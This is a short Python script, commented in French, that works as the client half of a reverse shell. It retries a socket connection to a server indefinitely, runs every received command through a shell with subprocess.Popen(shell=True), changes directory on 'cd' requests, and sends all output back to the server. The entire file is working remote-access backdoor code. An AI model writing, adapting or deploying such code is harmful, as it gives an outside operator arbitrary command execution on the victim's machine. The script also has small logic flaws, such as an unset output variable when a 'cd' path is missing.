#! /usr/bin/env python3
""" Les envoies se font en bytes donc on encode les str en b"""
import socket, subprocess, os, sys
from time import sleep


host = "localhost"
port = 5555

connection_with_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)		#création du socket

while connection_with_server.connect_ex((host, port)) != 0 :					#connexion au serveur à l'infini
	sleep(2)
																
print ("Established connection with the server on the port "+str(port))

end = ""

while end != b"end": 															#b pour bytes
	

	command = connection_with_server.recv(1024)
	
	if command.decode() == "end" :
		connection_with_server.send(command)
		end = command
		
	cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)  
																				#Popen -> création d'un programme fils dans un nouveau processus
																				#subprocess.PIPE -> rediretion vers le flux standard
	if command[:2].decode() == 'cd':
		command = command.decode()								
		if os.path.exists(str(command[3:])):									#vérification du chemin
			os.chdir(str(command[3:]))											#changement de dossier
			out = b"directory changed"
	else:
		out = cmd.stdout.read() + cmd.stderr.read()	 
	connection_with_server.send(out + b"\nEnd of the results\n ")

print ("Close of the session")
connection_with_server.close()

